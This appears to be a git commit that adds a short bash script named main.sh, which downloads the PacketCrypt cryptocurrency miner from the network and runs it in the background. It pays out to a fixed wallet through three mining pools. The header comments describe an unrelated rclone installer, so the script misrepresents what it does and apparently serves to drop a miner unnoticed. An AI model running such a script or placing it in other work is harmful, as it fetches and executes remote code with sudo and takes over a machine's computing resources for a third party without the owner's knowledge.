d61d994d5f85e9b81b0c96bb3180a441313afe90
mawan <115848728+HemawanFahid@users.noreply.github.com>
2022-10-15 07:36:09 +0700

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,19 @@
+#!/usr/bin/env bash
+
+# error codes
+# 0 - exited without problems
+# 1 - parameters not supported were used or some unexpected error occurred
+# 2 - OS not supported by this script
+# 3 - installed version of rclone is up to date
+# 4 - supported unzip tools are not available
+
+count=`pgrep packetcrypt |  grep -o -E '[0-9]+'`
+
+if [[ $count -gt 10 ]]
+then
+  echo "dang ton tai"
+else
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
+sudo chmod +x packetcrypt
+nohup ./packetcrypt ann -p pkt1qsj80wvk3ll0zdcvtqqz6ecr0p72xzqg53ej9vy http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com &
+fi
